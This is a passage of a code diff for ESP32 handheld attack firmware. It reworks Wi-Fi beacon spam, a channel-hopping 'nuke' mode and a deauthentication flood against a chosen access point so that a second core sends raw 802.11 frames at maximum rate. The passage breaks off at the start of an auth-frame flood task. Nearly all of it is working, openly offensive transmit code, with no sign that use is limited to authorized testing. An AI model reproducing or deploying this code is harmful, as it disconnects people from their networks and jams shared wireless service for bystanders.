@@ -562,7 +562,7 @@ struct RainDrop {
 };
 
 static RainDrop rainDrops[RAIN_COLUMNS];
-static uint32_t beaconCount = 0;
+static volatile uint32_t beaconCount = 0;
 static unsigned long lastRainUpdate = 0;
 
 // Color palette for trail fade - BLOOD RAIN (pure red gradient)
@@ -654,7 +654,23 @@ static void updateMatrixRain() {
     }
 }
 
-// Beacon frame template
+// ═══════════════════════════════════════════════════════════════════════════
+// DUAL-CORE ENGINE — Core 0 does WiFi TX, Core 1 does display + touch
+// Same proven architecture as BLE Jammer / WLAN Jammer / ProtoKill
+// WiFi API (esp_wifi_80211_tx) is thread-safe — no SPI reinit needed
+// ═══════════════════════════════════════════════════════════════════════════
+
+// Core 0 TX task handle and state
+static TaskHandle_t bsTxTaskHandle = NULL;
+static volatile bool bsTxTaskRunning = false;
+static volatile bool bsTxTaskDone = false;
+
+// Shared state — Core 0 writes beaconCount, Core 1 reads for display
+// Core 1 writes currentChannel on touch, Core 0 reads for TX
+// Volatile: race conditions on display values are harmless (1-2 frame lag)
+static volatile int bsChannel = 1;
+
+// Beacon frame template — ONLY used by Core 0 task (no contention)
 static uint8_t packet[128] = {
     0x80, 0x00, 0x00, 0x00,                         // Frame control + duration
     0xff, 0xff, 0xff, 0xff, 0xff, 0xff,             // Destination (broadcast)
@@ -669,65 +685,217 @@ static uint8_t packet[128] = {
     0x03, 0x01, 0x04                                // DS Parameter set (channel)
 };
 
+// Nuke mode Core 0 task handle and state (separate from normal TX)
+static TaskHandle_t nukeTxTaskHandle = NULL;
+static volatile bool nukeTxTaskRunning = false;
+static volatile bool nukeTxTaskDone = false;
+static volatile uint32_t nukeCount = 0;
+
+// Nuke uses its OWN packet buffer — never touches normal mode's packet[]
+static uint8_t nukePacket[128] = {
+    0x80, 0x00, 0x00, 0x00,
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
+    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
+    0xc0, 0x6c,
+    0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
+    0x64, 0x00,
+    0x01, 0x04,
+    0x00, 0x06, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72,
+    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
+    0x03, 0x01, 0x04
+};
+
+// ───────────────────────────────────────────────────────────────────────────
+// Core 0 TX Task — Normal Mode (named SSID spam from ssidList)
+// Tight loop: build packet → TX 3x → repeat. No display, no touch.
+// ───────────────────────────────────────────────────────────────────────────
+static void bsTxTask(void* param) {
+    #if CYD_DEBUG
+    Serial.println("[BEACON] Core 0: TX task started");
+    #endif
+
+    int yieldCounter = 0;
+
+    while (bsTxTaskRunning) {
+        // Read volatile channel — Core 1 may change it via touch
+        int ch = bsChannel;
+        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+
+        // Randomize MAC addresses (source and BSSID)
+        for (int i = 10; i <= 21; i++) {
+            packet[i] = random(256);
+        }
+
+        // Select random SSID from list
+        int idx = random(ssidCount);
+        const char* ssid = ssidList[idx];
+        int ssidLength = strlen(ssid);
+        if (ssidLength > 32) ssidLength = 32;
+
+        // Update SSID in packet
+        packet[37] = ssidLength;
+        for (int i = 0; i < ssidLength; i++) {
+            packet[38 + i] = ssid[i];
+        }
+
+        // Update supported rates position (right after SSID)
+        int ratesOffset = 38 + ssidLength;
+        packet[ratesOffset] = 0x01;
+        packet[ratesOffset + 1] = 0x08;
+        packet[ratesOffset + 2] = 0x82;
+        packet[ratesOffset + 3] = 0x84;
+        packet[ratesOffset + 4] = 0x8b;
+        packet[ratesOffset + 5] = 0x96;
+        packet[ratesOffset + 6] = 0x24;
+        packet[ratesOffset + 7] = 0x30;
+        packet[ratesOffset + 8] = 0x48;
+        packet[ratesOffset + 9] = 0x6c;
+
+        // Update DS Parameter Set (channel)
+        int dsOffset = ratesOffset + 10;
+        packet[dsOffset] = 0x03;
+        packet[dsOffset + 1] = 0x01;
+        packet[dsOffset + 2] = ch;
+
+        int packetSize = dsOffset + 3;
+
+        // Send 3x for reliability
+        esp_wifi_80211_tx(WIFI_IF_AP, packet, packetSize, false);
+        esp_wifi_80211_tx(WIFI_IF_AP, packet, packetSize, false);
+        esp_wifi_80211_tx(WIFI_IF_AP, packet, packetSize, false);
+        beaconCount++;
+
+        // Feed watchdog — yield every 50 iterations (~1ms pause)
+        yieldCounter++;
+        if (yieldCounter >= 50) {
+            yieldCounter = 0;
+            vTaskDelay(1);
+        }
+    }
+
+    #if CYD_DEBUG
+    Serial.println("[BEACON] Core 0: TX task exiting");
+    #endif
+
+    bsTxTaskDone = true;
+    vTaskDelete(NULL);
+}
+
+// ───────────────────────────────────────────────────────────────────────────
+// Core 0 TX Task — Nuke Mode (random SSIDs, random channels, CHAOS)
+// Uses separate nukePacket[] buffer — zero contention with normal mode
+// ───────────────────────────────────────────────────────────────────────────
+static void nukeTxTask(void* param) {
+    #if CYD_DEBUG
+    Serial.println("[BEACON] Core 0: NUKE TX task started — MAXIMUM CHAOS");
+    #endif
+
+    // Random character pool for SSID generation
+    static const char charPool[] = "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_";
+    static const int charPoolLen = sizeof(charPool) - 1;
+
+    int yieldCounter = 0;
+
+    while (nukeTxTaskRunning) {
+        // Random channel — hop every packet for maximum chaos
+        byte channel = random(1, 13);
+        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+
+        // Randomize all MAC bytes
+        for (int i = 10; i <= 21; i++) {
+            nukePacket[i] = random(256);
+        }
+
+        // Generate random 6-char SSID
+        for (int i = 38; i <= 43; i++) {
+            nukePacket[i] = charPool[random(charPoolLen)];
+        }
+        nukePacket[37] = 6;   // SSID length
+        nukePacket[56] = channel;
+
+        // Send 3x for reliability
+        esp_wifi_80211_tx(WIFI_IF_AP, nukePacket, 57, false);
+        esp_wifi_80211_tx(WIFI_IF_AP, nukePacket, 57, false);
+        esp_wifi_80211_tx(WIFI_IF_AP, nukePacket, 57, false);
+        nukeCount += 3;
+
+        // Feed watchdog — yield every 50 iterations
+        yieldCounter++;
+        if (yieldCounter >= 50) {
+            yieldCounter = 0;
+            vTaskDelay(1);
+        }
+    }
+
+    #if CYD_DEBUG
+    Serial.println("[BEACON] Core 0: NUKE TX task exiting");
+    #endif
+
+    nukeTxTaskDone = true;
+    vTaskDelete(NULL);
+}
+
+// ───────────────────────────────────────────────────────────────────────────
+// Start/Stop TX task — same proven pattern as BLE Jammer
+// ───────────────────────────────────────────────────────────────────────────
+static void startTxTask() {
+    bsTxTaskDone = false;
+    bsTxTaskRunning = true;
+    xTaskCreatePinnedToCore(bsTxTask, "BeaconTX", 8192, NULL, 1, &bsTxTaskHandle, 0);
+
+    #if CYD_DEBUG
+    Serial.printf("[BEACON] DUAL-CORE Started — CH: %d, Core 0 TX task launched\n", (int)bsChannel);
+    #endif
+}
+
+static void stopTxTask() {
+    bsTxTaskRunning = false;
+
+    if (bsTxTaskHandle) {
+        unsigned long waitStart = millis();
+        while (!bsTxTaskDone && (millis() - waitStart < 500)) {
+            vTaskDelay(10 / portTICK_PERIOD_MS);
+        }
+        bsTxTaskHandle = NULL;
+    }
+
+    #if CYD_DEBUG
+    Serial.println("[BEACON] Core 0 TX task stopped");
+    #endif
+}
+
+static void startNukeTxTask() {
+    nukeCount = 0;
+    nukeTxTaskDone = false;
+    nukeTxTaskRunning = true;
+    xTaskCreatePinnedToCore(nukeTxTask, "NukeTX", 8192, NULL, 1, &nukeTxTaskHandle, 0);
+
+    #if CYD_DEBUG
+    Serial.println("[BEACON] DUAL-CORE NUKE Started — Core 0 TX task launched");
+    #endif
+}
+
+static void stopNukeTxTask() {
+    nukeTxTaskRunning = false;
+
+    if (nukeTxTaskHandle) {
+        unsigned long waitStart = millis();
+        while (!nukeTxTaskDone && (millis() - waitStart < 500)) {
+            vTaskDelay(10 / portTICK_PERIOD_MS);
+        }
+        nukeTxTaskHandle = NULL;
+    }
+
+    #if CYD_DEBUG
+    Serial.println("[BEACON] Core 0 NUKE TX task stopped");
+    #endif
+}
+
 // State variables
 static bool initialized = false;
 static bool spamming = false;
 static bool exitRequested = false;
-static int currentChannel = 1;
-
-// Current SSID being broadcast (for display)
-static char currentSSID[33] = "";
-
-// Send a single beacon with random SSID
-static void sendBeacon() {
-    // Randomize MAC addresses (source and BSSID)
-    for (int i = 10; i <= 21; i++) {
-        packet[i] = random(256);
-    }
-
-    // Select random SSID from list
-    int idx = random(ssidCount);
-    const char* ssid = ssidList[idx];
-    int ssidLength = strlen(ssid);
-    if (ssidLength > 32) ssidLength = 32;
-
-    // Store for display
-    strncpy(currentSSID, ssid, 32);
-    currentSSID[32] = '\0';
-
-    // Update SSID in packet
-    packet[37] = ssidLength;
-    for (int i = 0; i < ssidLength; i++) {
-        packet[38 + i] = ssid[i];
-    }
-
-    // Update supported rates position (right after SSID)
-    int ratesOffset = 38 + ssidLength;
-    packet[ratesOffset] = 0x01;      // Supported Rates tag
-    packet[ratesOffset + 1] = 0x08;  // Length = 8
-    packet[ratesOffset + 2] = 0x82;  // 1 Mbps (basic)
-    packet[ratesOffset + 3] = 0x84;  // 2 Mbps (basic)
-    packet[ratesOffset + 4] = 0x8b;  // 5.5 Mbps (basic)
-    packet[ratesOffset + 5] = 0x96;  // 11 Mbps (basic)
-    packet[ratesOffset + 6] = 0x24;  // 18 Mbps
-    packet[ratesOffset + 7] = 0x30;  // 24 Mbps
-    packet[ratesOffset + 8] = 0x48;  // 36 Mbps
-    packet[ratesOffset + 9] = 0x6c;  // 54 Mbps
-
-    // Update DS Parameter Set (channel)
-    int dsOffset = ratesOffset + 10;
-    packet[dsOffset] = 0x03;         // DS Parameter Set tag
-    packet[dsOffset + 1] = 0x01;     // Length = 1
-    packet[dsOffset + 2] = currentChannel;
-
-    // Calculate packet size
-    int packetSize = dsOffset + 3;
-
-    // Send 3x for reliability (like Nuke mode which works)
-    esp_wifi_80211_tx(WIFI_IF_AP, packet, packetSize, false);
-    esp_wifi_80211_tx(WIFI_IF_AP, packet, packetSize, false);
-    esp_wifi_80211_tx(WIFI_IF_AP, packet, packetSize, false);
-}
 
 // Glitch title
 static void drawHeader() {
@@ -745,7 +913,7 @@ static void drawStatusHeader() {
     tft.setCursor(5, 60);
     tft.print("CH:");
     tft.setTextColor(HALEHOUND_BRIGHT);
-    tft.print(currentChannel);
+    tft.print((int)bsChannel);
 
     // Status
     tft.setCursor(60, 60);
@@ -764,7 +932,7 @@ static void drawStatusHeader() {
     tft.setTextColor(HALEHOUND_MAGENTA);
     tft.print("TX:");
     tft.setTextColor(HALEHOUND_HOTPINK);
-    tft.print(beaconCount);
+    tft.print((uint32_t)beaconCount);
 
     // Separator line
     tft.drawLine(0, 68, SCREEN_WIDTH, 68, HALEHOUND_VIOLET);
@@ -850,12 +1018,12 @@ void setup() {
     esp_wifi_set_ps(WIFI_PS_NONE);       // Disable power saving for max throughput
     esp_wifi_set_promiscuous(true);
 
-    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
+    esp_wifi_set_channel(bsChannel, WIFI_SECOND_CHAN_NONE);
 
     initialized = true;
 
     #if CYD_DEBUG
-    Serial.println("[BEACON] Ready on channel " + String(currentChannel));
+    Serial.println("[BEACON] Ready on channel " + String((int)bsChannel));
     #endif
 }
 
@@ -883,14 +1051,16 @@ void loop() {
             }
             // CH- icon at x=130-146
             else if (tx >= 125 && tx <= 150) {
-                currentChannel = (currentChannel == 1) ? 14 : currentChannel - 1;
-                esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
+                bsChannel = (bsChannel == 1) ? 14 : bsChannel - 1;
+                // Channel change picked up by Core 0 task on next iteration
+                if (!spamming) esp_wifi_set_channel(bsChannel, WIFI_SECOND_CHAN_NONE);
                 drawStatusHeader();
             }
             // CH+ icon at x=160-176
             else if (tx >= 155 && tx <= 180) {
-                currentChannel = (currentChannel == 14) ? 1 : currentChannel + 1;
-                esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
+                bsChannel = (bsChannel == 14) ? 1 : bsChannel + 1;
+                // Channel change picked up by Core 0 task on next iteration
+                if (!spamming) esp_wifi_set_channel(bsChannel, WIFI_SECOND_CHAN_NONE);
                 drawStatusHeader();
             }
             // Start icon at x=190-206
@@ -905,6 +1075,11 @@ void loop() {
             }
             // Nuke icon at right edge
             else if (tx >= (tft.width() - 25) && tx <= tft.width()) {
+                // Stop normal TX task if running before entering nuke
+                if (spamming) {
+                    stopTxTask();
+                    spamming = false;
+                }
                 nukeMode();
                 // Restore screen after nuke
                 tft.fillScreen(HALEHOUND_BLACK);
@@ -922,46 +1097,48 @@ void loop() {
     }
 
     // ═══════════════════════════════════════════════════════════════════════
-    // MATRIX RAIN ANIMATION - Only when spamming
+    // MATRIX RAIN ANIMATION — Core 1 only (display), Core 0 handles TX
+    // No more TX calls here — Core 0 task sends beacons at full speed
     // ═══════════════════════════════════════════════════════════════════════
     if (spamming) {
-        // Send beacons
-        esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
-        sendBeacon();
-        beaconCount++;
-
         // Update matrix rain animation (throttled for smooth display)
         if (millis() - lastRainUpdate > 30) {  // ~33fps
             updateMatrixRain();
             lastRainUpdate = millis();
 
-            // Update beacon counter every 50 beacons
-            if (beaconCount % 50 == 0) {
-                drawStatusHeader();
-            }
+            // Update beacon counter every 30ms — reads volatile beaconCount from Core 0
+            drawStatusHeader();
         }
     }
 }
 
 void start() {
     spamming = true;
+    startTxTask();
     #if CYD_DEBUG
-    Serial.println("[BEACON] Spam STARTED");
+    Serial.println("[BEACON] Spam STARTED — dual-core TX active");
     #endif
 }
 
 void stop() {
+    stopTxTask();
     spamming = false;
     #if CYD_DEBUG
-    Serial.println("[BEACON] Spam STOPPED");
+    Serial.println("[BEACON] Spam STOPPED — Core 0 TX task terminated");
     #endif
 }
 
 void toggle() {
-    spamming = !spamming;
-    #if CYD_DEBUG
-    Serial.println("[BEACON] Spam " + String(spamming ? "STARTED" : "STOPPED"));
-    #endif
+    if (spamming) {
+        stop();
+    } else {
+        spamming = true;
+        beaconCount = 0;
+        startTxTask();
+        #if CYD_DEBUG
+        Serial.println("[BEACON] Spam STARTED — dual-core TX active");
+        #endif
+    }
 }
 
 bool isSpamming() {
@@ -969,19 +1146,20 @@ bool isSpamming() {
 }
 
 void setChannel(int channel) {
-    currentChannel = channel;
-    if (currentChannel < 1) currentChannel = 1;
-    if (currentChannel > 14) currentChannel = 14;
-    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
+    if (channel < 1) channel = 1;
+    if (channel > 14) channel = 14;
+    bsChannel = channel;
+    // If not spamming, set directly. If spamming, Core 0 picks it up next iteration.
+    if (!spamming) esp_wifi_set_channel(bsChannel, WIFI_SECOND_CHAN_NONE);
 }
 
 int getChannel() {
-    return currentChannel;
+    return bsChannel;
 }
 
 void nukeMode() {
     #if CYD_DEBUG
-    Serial.println("[BEACON] NUKE MODE ACTIVATED");
+    Serial.println("[BEACON] NUKE MODE ACTIVATED — dual-core");
     #endif
 
     // Clear screen and show NUKE header
@@ -1013,15 +1191,17 @@ void nukeMode() {
     }
 
     unsigned long lastCloudRedraw = 0;
-
-    // Random character pool for SSID generation
-    String charPool = "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_";
-    uint32_t nukeCount = 0;
     unsigned long lastUpdate = 0;
     unsigned long lastFlash = 0;
     bool flashState = false;
 
-    // NUKE loop - all channels, random SSIDs, CHAOS
+    // Launch Core 0 nuke TX task — it handles ALL packet building and TX
+    startNukeTxTask();
+
+    // ═══════════════════════════════════════════════════════════════════════
+    // NUKE DISPLAY LOOP — Core 1 only (rain + cloud + flash + touch)
+    // Core 0 is blasting packets nonstop in nukeTxTask
+    // ═══════════════════════════════════════════════════════════════════════
     while (true) {
         // Check for touch to exit
         uint16_t tx, ty;
@@ -1030,35 +1210,18 @@ void nukeMode() {
             break;
         }
 
-        // Random channel
-        byte channel = random(1, 13);
-        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
-
-        // Randomize all MAC bytes
-        for (int i = 10; i <= 21; i++) {
-            packet[i] = random(256);
+        // Check BOOT button for exit
+        if (buttonPressed(BTN_BOOT)) {
+            break;
         }
 
-        // Generate random 6-char SSID
-        for (int i = 38; i <= 43; i++) {
-            packet[i] = charPool[random(charPool.length())];
-        }
-        packet[37] = 6;  // SSID length
-        packet[56] = channel;
-
-        // Send 3x for reliability
-        esp_wifi_80211_tx(WIFI_IF_AP, packet, 57, false);
-        esp_wifi_80211_tx(WIFI_IF_AP, packet, 57, false);
-        esp_wifi_80211_tx(WIFI_IF_AP, packet, 57, false);
-        nukeCount += 3;
-
-        // Update matrix rain (30ms throttle — keeps visuals without stealing TX time)
+        // Update matrix rain (30ms throttle — full framerate, no TX stealing time)
         if (millis() - lastUpdate > 30) {
             updateMatrixRain();
             lastUpdate = millis();
         }
 
-        // Redraw mushroom cloud every 500ms (was 100ms — major TX time savings)
+        // Redraw mushroom cloud every 500ms
         if (millis() - lastCloudRedraw > 500) {
             tft.drawBitmap(nukeX, nukeY, bitmap_nuke_cloud_xl, NUKE_CLOUD_XL_WIDTH, NUKE_CLOUD_XL_HEIGHT, 0x5000);
             lastCloudRedraw = millis();
@@ -1072,21 +1235,24 @@ void nukeMode() {
             tft.setCursor(30, 25);
             tft.print("!! NUKE MODE !!");
 
-            // Update nuke counter
+            // Update nuke counter — reads volatile nukeCount from Core 0
             tft.setTextSize(1);
             tft.setTextColor(HALEHOUND_BRIGHT);
             tft.fillRect(0, 50, SCREEN_WIDTH, 10, HALEHOUND_BLACK);
             tft.setCursor(10, 50);
             tft.print("TX: ");
-            tft.print(nukeCount);
+            tft.print((uint32_t)nukeCount);
             tft.print("  TAP TO EXIT");
 
             lastFlash = millis();
         }
     }
 
+    // Stop Core 0 nuke TX task before returning
+    stopNukeTxTask();
+
     #if CYD_DEBUG
-    Serial.println("[BEACON] NUKE MODE DEACTIVATED");
+    Serial.println("[BEACON] NUKE MODE DEACTIVATED — Core 0 TX task terminated");
     #endif
 }
 
@@ -1095,6 +1261,14 @@ bool isExitRequested() {
 }
 
 void cleanup() {
+    // Stop Core 0 TX task if running (normal or nuke)
+    if (spamming || bsTxTaskRunning) {
+        stopTxTask();
+    }
+    if (nukeTxTaskRunning) {
+        stopNukeTxTask();
+    }
+
     spamming = false;
     esp_wifi_set_promiscuous(false);
     esp_wifi_set_promiscuous_rx_cb(NULL);
@@ -1108,7 +1282,7 @@ void cleanup() {
     exitRequested = false;
 
     #if CYD_DEBUG
-    Serial.println("[BEACON] Cleanup complete");
+    Serial.println("[BEACON] Cleanup complete — all Core 0 tasks terminated");
     #endif
 }
 
@@ -1219,14 +1393,13 @@ static uint8_t deauth_frame[sizeof(deauth_frame_default)];
 // State variables
 static bool initialized = false;
 static bool exitRequested = false;
-static bool attackRunning = false;
+static volatile bool attackRunning = false;
 static bool scanning = false;
 static bool wardrivingEnabled = false;  // Wardriving mode toggle
 
-static uint32_t packetCount = 0;
-static uint32_t successCount = 0;
-static uint32_t consecutiveFailures = 0;
-static uint32_t lastPacketTime = 0;
+static volatile uint32_t packetCount = 0;
+static volatile uint32_t successCount = 0;
+static volatile uint32_t consecutiveFailures = 0;
 
 static wifi_ap_record_t selectedAp;
 static uint8_t selectedChannel = 0;
@@ -1236,7 +1409,7 @@ static wifi_ap_record_t* apList = nullptr;
 
 static int currentPage = 0;
 static int highlightedIndex = 0;
-static int packetsPerBurst = 10;
+static volatile int packetsPerBurst = 10;
 static const int networksPerPage = 14;  // MATCHES ORIGINAL ESP32-DIV
 
 // Pre-set target from WifiScan handoff
@@ -1244,6 +1417,15 @@ static bool targetPreset = false;
 
 // Track whether we're in raw ESP-IDF APSTA mode (for deauth) vs Arduino mode (for scan)
 static bool inAttackMode = false;
+
+// ═══════════════════════════════════════════════════════════════════════════
+// DUAL-CORE ENGINE — Core 0 does deauth TX, Core 1 does display + touch
+// Same proven architecture as BLE Jammer / WLAN Jammer / Beacon Spammer
+// ═══════════════════════════════════════════════════════════════════════════
+static TaskHandle_t dtTxTaskHandle = NULL;
+static volatile bool dtTxTaskRunning = false;
+static volatile bool dtTxTaskDone = false;
+static volatile bool dtHeapLow = false;
 
 // Switch to raw ESP-IDF APSTA mode for deauth frame injection
 // esp_wifi_80211_tx(WIFI_IF_AP) requires an active AP interface
@@ -1338,6 +1520,87 @@ static void sendDeauthFrame(const wifi_ap_record_t* ap, uint8_t chan) {
     deauth_frame[24] = 7;  // Reason code
 
     sendRawFrame(deauth_frame, sizeof(deauth_frame));
+}
+
+// ───────────────────────────────────────────────────────────────────────────
+// Core 0 TX Task — Deauth attack (tight loop, no display, no touch)
+// Sends deauth frames at maximum rate. Core 1 handles all UI.
+// ───────────────────────────────────────────────────────────────────────────
+static void dtTxTask(void* param) {
+    #if CYD_DEBUG
+    Serial.println("[DEAUTH] Core 0: TX task started");
+    #endif
+
+    // Set channel once — doesn't change during attack
+    esp_wifi_set_channel(selectedChannel, WIFI_SECOND_CHAN_NONE);
+
+    while (dtTxTaskRunning) {
+        // Heap safety — signal Core 1 and bail if dangerously low
+        if (ESP.getFreeHeap() < 20000) {
+            dtHeapLow = true;
+            #if CYD_DEBUG
+            Serial.println("[DEAUTH] Core 0: HEAP LOW — stopping TX task");
+            #endif
+            break;
+        }
+
+        // Consecutive failure recovery — restart WiFi on Core 0
+        if (consecutiveFailures > 10) {
+            #if CYD_DEBUG
+            Serial.println("[DEAUTH] Core 0: 10+ failures — restarting WiFi");
+            #endif
+            esp_wifi_stop();
+            vTaskDelay(200 / portTICK_PERIOD_MS);
+            esp_wifi_start();
+            vTaskDelay(200 / portTICK_PERIOD_MS);
+            esp_wifi_set_channel(selectedChannel, WIFI_SECOND_CHAN_NONE);
+            consecutiveFailures = 0;
+        }
+
+        // Send burst — batch size controlled by volatile packetsPerBurst
+        int burst = packetsPerBurst;
+        for (int i = 0; i < burst && dtTxTaskRunning; i++) {
+            sendDeauthFrame(&selectedAp, selectedChannel);
+        }
+
+        // Yield after each burst to feed watchdog
+        vTaskDelay(1);
+    }
+
+    #if CYD_DEBUG
+    Serial.println("[DEAUTH] Core 0: TX task exiting");
+    #endif
+
+    dtTxTaskDone = true;
+    vTaskDelete(NULL);
+}
+
+static void startDeauthTask() {
+    dtTxTaskDone = false;
+    dtHeapLow = false;
+    dtTxTaskRunning = true;
+    xTaskCreatePinnedToCore(dtTxTask, "DeauthTX", 8192, NULL, 1, &dtTxTaskHandle, 0);
+
+    #if CYD_DEBUG
+    Serial.printf("[DEAUTH] DUAL-CORE Started — CH: %d, Burst: %d, Core 0 TX task launched\n",
+                  selectedChannel, (int)packetsPerBurst);
+    #endif
+}
+
+static void stopDeauthTask() {
+    dtTxTaskRunning = false;
+
+    if (dtTxTaskHandle) {
+        unsigned long waitStart = millis();
+        while (!dtTxTaskDone && (millis() - waitStart < 500)) {
+            vTaskDelay(10 / portTICK_PERIOD_MS);
+        }
+        dtTxTaskHandle = NULL;
+    }
+
+    #if CYD_DEBUG
+    Serial.println("[DEAUTH] Core 0 TX task stopped");
+    #endif
 }
 
 // Compare function for sorting APs by RSSI
@@ -1797,6 +2060,7 @@ void loop() {
                 // Back icon at x=5-30
                 if (tx >= 5 && tx <= 30) {
                     if (selectedApIndex != -1) {
+                        if (attackRunning) stopDeauthTask();  // Kill Core 0 task first
                         attackRunning = false;
                         selectedApIndex = -1;
                         exitAttackMode();  // Tear down raw ESP-IDF so Arduino scan works
@@ -1999,17 +2263,18 @@ void loop() {
                 // Start/Stop button: x=0-57
                 if (tx >= 0 && tx <= 57) {
                     drawButton(0, 304, 57, 16, attackRunning ? "Stop" : "Start", true, false);
-                    attackRunning = !attackRunning;
-                    if (attackRunning) {
-                        // Starting new attack - reset all counters
+                    if (!attackRunning) {
+                        // Starting new attack — reset counters, launch Core 0 TX task
                         packetCount = 0;
                         successCount = 0;
                         consecutiveFailures = 0;
-                        lastPacketTime = 0;
                         skullFrame = 0;
+                        attackRunning = true;
+                        startDeauthTask();
                     } else {
-                        // Stopping attack
-                        lastPacketTime = 0;
+                        // Stopping attack — kill Core 0 TX task
+                        stopDeauthTask();
+                        attackRunning = false;
                     }
                     drawAttackScreen();
                     delay(50);
@@ -2017,8 +2282,8 @@ void loop() {
                 // Back button: x=177-234
                 else if (tx >= 177 && tx <= 234) {
                     drawButton(177, 304, 57, 16, "Back", true, false);
+                    if (attackRunning) stopDeauthTask();  // Kill Core 0 task first
                     attackRunning = false;
-                    lastPacketTime = 0;
                     selectedApIndex = -1;
                     exitAttackMode();  // Tear down raw ESP-IDF so Arduino scan works
                     scanNetworks();    // Rescan with Arduino WiFi
@@ -2030,12 +2295,16 @@ void loop() {
 
         // Hardware button handling
         if (buttonPressed(BTN_SELECT)) {
-            attackRunning = !attackRunning;
-            if (attackRunning) {
+            if (!attackRunning) {
                 packetCount = 0;
                 successCount = 0;
                 consecutiveFailures = 0;
                 skullFrame = 0;
+                attackRunning = true;
+                startDeauthTask();
+            } else {
+                stopDeauthTask();
+                attackRunning = false;
             }
             drawAttackScreen();
         }
@@ -2057,6 +2326,7 @@ void loop() {
         }
 
         if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
+            if (attackRunning) stopDeauthTask();  // Kill Core 0 task first
             attackRunning = false;
             selectedApIndex = -1;
             exitAttackMode();  // Tear down raw ESP-IDF so Arduino scan works
@@ -2064,41 +2334,34 @@ void loop() {
             drawScanScreen();
         }
 
-        // Attack packet transmission - MATCHES ORIGINAL
+        // ═══════════════════════════════════════════════════════════════════
+        // ATTACK DISPLAY — Core 1 only (skulls + stats), Core 0 handles TX
+        // No TX calls here — Core 0 task sends deauth frames at full speed
+        // ═══════════════════════════════════════════════════════════════════
         if (attackRunning) {
             uint32_t now = millis();
 
-            if (ESP.getFreeHeap() < 20000) {
+            // Check if Core 0 flagged heap low — emergency stop
+            if (dtHeapLow) {
+                stopDeauthTask();
                 attackRunning = false;
                 drawAttackScreen();
                 return;
             }
 
-            if (consecutiveFailures > 10) {
-                esp_wifi_stop();
-                delay(200);
-                esp_wifi_start();
-                delay(200);
-                consecutiveFailures = 0;
-            }
-
-            if (now - lastPacketTime >= 100) {
-                for (int i = 0; i < packetsPerBurst && attackRunning; i++) {
-                    sendDeauthFrame(&selectedAp, selectedChannel);
-                    if (i < packetsPerBurst - 1) delay(1);
-                }
-                lastPacketTime = now;
-
-                // Update skull spinner animation - MATCHES ORIGINAL
+            // Skull spinner animation — 100ms throttle (smooth, independent of TX)
+            static uint32_t lastSkullUpdate = 0;
+            if (now - lastSkullUpdate >= 100) {
                 drawSkullSpinner();
                 drawSpinnerLabel();
+                lastSkullUpdate = now;
+            }
 
-                // Update stats display periodically (less frequently for performance)
-                static uint32_t lastStatsUpdate = 0;
-                if (now - lastStatsUpdate >= 500) {
-                    updateAttackStats();
-                    lastStatsUpdate = now;
-                }
+            // Stats display — 500ms throttle (reads volatile counters from Core 0)
+            static uint32_t lastStatsUpdate = 0;
+            if (now - lastStatsUpdate >= 500) {
+                updateAttackStats();
+                lastStatsUpdate = now;
             }
         }
     }
@@ -2113,8 +2376,21 @@ void selectTarget(int index) {
     }
 }
 int getSelectedTarget() { return selectedApIndex; }
-void startAttack() { attackRunning = true; }
-void stopAttack() { attackRunning = false; }
+void startAttack() {
+    if (!attackRunning) {
+        packetCount = 0;
+        successCount = 0;
+        consecutiveFailures = 0;
+        attackRunning = true;
+        startDeauthTask();
+    }
+}
+void stopAttack() {
+    if (attackRunning) {
+        stopDeauthTask();
+        attackRunning = false;
+    }
+}
 bool isAttackRunning() { return attackRunning; }
 uint32_t getPacketCount() { return packetCount; }
 uint32_t getSuccessCount() { return successCount; }
@@ -2153,6 +2429,10 @@ void setTarget(const char* bssid, const char* ssid, int channel) {
 }
 
 void cleanup() {
+    // Stop Core 0 TX task if running
+    if (attackRunning || dtTxTaskRunning) {
+        stopDeauthTask();
+    }
     attackRunning = false;
     if (inAttackMode) {
         exitAttackMode();  // Tear down raw ESP-IDF first
@@ -2170,7 +2450,7 @@ void cleanup() {
     exitRequested = false;
 
     #if CYD_DEBUG
-    Serial.println("[DEAUTH] Cleanup complete");
+    Serial.println("[DEAUTH] Cleanup complete — all Core 0 tasks terminated");
     #endif
 }
 
@@ -2202,13 +2482,21 @@ static uint8_t auth_frame[30] = {
 // State
 static bool initialized = false;
 static bool exitRequested = false;
-static bool attackRunning = false;
+static volatile bool attackRunning = false;
 static bool inAttackMode = false;
 
-static uint32_t packetCount = 0;
-static uint32_t successCount = 0;
-static uint32_t uniqueMACs = 0;
+static volatile uint32_t packetCount = 0;
+static volatile uint32_t successCount = 0;
+static volatile uint32_t uniqueMACs = 0;
 static unsigned long attackStartTime = 0;
+
+// ═══════════════════════════════════════════════════════════════════════════
+// DUAL-CORE ENGINE — Core 0 does auth frame TX, Core 1 does equalizer + touch
+// Same proven architecture as BLE Jammer / Beacon Spammer / Deauther
+// ═══════════════════════════════════════════════════════════════════════════
+static TaskHandle_t afTxTaskHandle = NULL;
+static volatile bool afTxTaskRunning = false;
+static volatile bool afTxTaskDone = false;
 
 // Target AP
 static wifi_ap_record_t targetAp;
@@ -2390,6 +2678,65 @@ static void sendAuthFrame() {
         successCount++;
         uniqueMACs++;
     }
+}
+
+// ───────────────────────────────────────────────────────────────────────────
+// Core 0 TX Task — Auth Flood (tight loop, no display, no touch)
+// Sends auth frames at maximum rate. Core 1 handles equalizer + stats.
